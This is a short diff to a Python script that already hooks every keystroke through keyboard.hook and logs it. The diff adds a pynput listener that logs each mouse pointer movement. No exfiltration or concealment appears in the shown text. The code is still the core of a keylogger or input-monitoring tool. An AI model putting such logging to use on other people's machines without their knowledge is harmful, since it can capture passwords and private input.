@@ -6,6 +6,7 @@ from pynput import mouse
 import time
 import keyboard
 import logging
+from pynput.mouse import Controller, Listener
 
 
 
@@ -56,6 +57,12 @@ def log_keypress(e):
 
 keyboard.hook(log_keypress)
 
+def on_move(x, y):
+   print('Pointer moved to {0}'.format((x, y)))
+   logger.info('Pointer moved to {0}'.format((x, y)))
+
+with Listener(on_move=on_move) as listener:
+   listener.join()
 
 
 while True:
